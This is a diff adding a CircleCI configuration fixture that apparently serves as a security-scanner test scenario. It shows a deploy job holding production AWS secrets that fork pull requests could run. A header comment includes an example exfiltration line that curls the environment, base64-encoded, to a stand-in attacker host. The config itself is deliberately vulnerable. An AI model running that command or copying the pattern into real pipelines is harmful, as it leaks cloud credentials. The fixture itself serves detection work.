@@ -1,0 +1,33 @@
+# scenarios/87-circleci-forked-pr-secrets
+# CICD-SEC-6 (Insufficient Credential Hygiene) · CICD-SEC-4 — CircleCI — CRITICAL
+#
+# Pattern: a job consumes a context / project secret AND the project has both
+# "Build forked pull requests" and "Pass secrets to builds from forked pull
+# requests" enabled. Any low-privilege user opens a fork PR editing
+# `.circleci/config.yml` to `run: curl https://attacker/?env=$(env|base64)` and
+# exfiltrates every project secret. Documented by Nathan Davison ("Shaking
+# secrets out of CircleCI builds") and CircleCI's own forked-PR advisory.
+#
+# The two toggles are ACCOUNT/PROJECT settings (not in this file); shown here is
+# the in-file half — a secret-bearing job that a fork PR can run.
+#
+# SAFETY: static fixture, nested under scenarios/ (CircleCI runs only the root
+# config.yml). See README.md.
+
+version: 2.1
+
+workflows:
+  deploy:
+    jobs:
+      - deploy:
+          context: aws-production   # long-lived cloud secrets live in this context
+
+jobs:
+  deploy:
+    docker:
+      - image: cimg/base@sha256:1d3f5a7c9e2b4d6f8a0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d0f2a4c6e8b0d2f
+    steps:
+      - checkout
+      # DANGER — with secrets passed to forked PRs, this fork-controlled step
+      # runs with $AWS_SECRET_ACCESS_KEY (from the context) in its environment.
+      - run: ./deploy.sh
